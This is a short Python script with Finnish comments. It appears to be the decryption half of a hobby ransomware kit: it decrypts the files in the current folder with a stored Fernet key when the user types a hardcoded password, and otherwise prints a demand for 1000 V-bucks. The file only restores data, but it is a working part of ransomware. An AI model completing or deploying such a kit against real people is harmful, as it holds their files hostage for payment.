
import os
from cryptography.fernet import Fernet
#Etsi tiedostoja

files = []

for file in os.listdir():
    #ransomware tiedoston nimi
    if file == "python_ransomware.py" or file == "thekey.key" or file == "decrypt.py":
            continue
    if os.path.isfile(file):
        files.append(file)




with open("thekey.key", "rb") as key:
        secretkey = key.read()


#Salasana
secretphrase = "salasana123"

user_phrase = input("Anna salasana, jotta voit purkaa salauksen\n ")

if user_phrase == secretphrase:
    
    print("Sinun tiedostojen salaus on purettu :)")

    for file in files:

            with open(file, "rb") as thefile:
                    contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)

            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
            

else:
        print(":( ERROR Wrong password. Anna minulle 1000 V-bucksia niin avaan salauksen :)")